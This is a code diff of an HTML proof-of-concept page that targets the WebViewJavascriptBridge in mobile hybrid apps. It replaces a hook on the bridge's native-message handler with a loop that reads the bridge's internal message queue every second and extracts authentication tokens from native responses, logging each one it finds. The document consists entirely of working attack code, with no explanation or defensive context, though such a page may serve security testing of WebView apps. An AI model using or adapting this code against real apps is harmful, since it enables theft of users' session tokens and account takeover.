@@ -5,30 +5,36 @@
       document.getElementById('log').textContent += '\n' + msg;
     }
 
-    const interval = setInterval(() => {
-      if (window.WebViewJavascriptBridge) {
-        clearInterval(interval);
-        log('[*] Bridge Detected!');
+    const poll = setInterval(() => {
+      if (!window.WebViewJavascriptBridge) return;
 
-        const originalHandle = WebViewJavascriptBridge._handleMessageFromNative;
-        WebViewJavascriptBridge._handleMessageFromNative = function(msg) {
-          log('[+] _handleMessageFromNative called!');
-          log('[+] Raw msg: ' + msg);
-          try {
-            const parsed = JSON.parse(msg);
-            if (parsed.responseData && typeof parsed.responseData === 'string') {
-              log('[+] responseData: ' + parsed.responseData);
-              const tokenMatch = parsed.responseData.match(/"token" *: *"([^"]+)"/);
-              if (tokenMatch) {
-                log('[!] Token Found: ' + tokenMatch[1]);
+      log('[*] Bridge Detected!');
+      clearInterval(poll);
+
+      // poll every second for native messages
+      setInterval(() => {
+        try {
+          const queue = WebViewJavascriptBridge._fetchQueue();
+          if (queue && typeof queue === 'string') {
+            const messages = JSON.parse(queue);
+            log('[+] Queue fetched: ' + messages.length + ' message(s)');
+
+            for (const msg of messages) {
+              log('[*] Message: ' + JSON.stringify(msg));
+              if (msg.responseData) {
+                log('[+] responseData: ' + msg.responseData);
+
+                const tokenMatch = msg.responseData.match(/"token"\s*:\s*"([^"]+)"/);
+                if (tokenMatch) {
+                  log('[!!!] Token Found: ' + tokenMatch[1]);
+                }
               }
             }
-          } catch (e) {
-            log('[x] JSON parse error: ' + e);
           }
-          return originalHandle.call(this, msg);
-        };
-      }
+        } catch (e) {
+          log('[!] Error parsing queue: ' + e);
+        }
+      }, 1000);
     }, 500);
   </script>
 </body>
